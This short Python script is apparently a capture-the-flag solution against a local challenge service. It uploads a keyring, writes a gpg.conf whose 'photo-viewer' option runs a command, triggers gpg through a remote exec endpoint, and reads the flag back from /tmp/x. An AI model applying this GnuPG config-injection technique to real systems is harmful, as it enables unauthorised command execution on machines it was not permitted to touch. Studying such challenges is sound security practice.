import requests


TARGET = "http://localhost:6664"

def remoteExec(cmd):
    params = {"cmd": cmd}
    try:
        resp = requests.get(f"{TARGET}/exec", params=params, timeout=1)
    except requests.exceptions.Timeout:
        pass
    return #resp

def remoteWrite(fn, payload):
    params = {"filename": fn}
    resp = requests.post(f"{TARGET}/write", params=params, data=payload)
    return resp

def remoteRead(fn):
    #target += "/read"
    params = {"filename": fn}
    resp = requests.get(f"{TARGET}/read", params=params)
    return resp


gpg_conf = """
list-options show-photos
photo-viewer /would you be so kind to provide me with a flag > /tmp/x
list-keys
"""

# create .gnupg config directory
remoteExec("gpg")

# upload/write keyring file that holds photo
with open("pubring.kbx", "rb") as f:
    print(remoteWrite("/home/user/.gnupg/pubring.kbx", f.read()).text)

# write config file
print(remoteWrite("/home/user/.gnupg/gpg.conf", gpg_conf).text)

# run gpg again
remoteExec("gpg")

# get flag
print(remoteRead("/tmp/x").text)
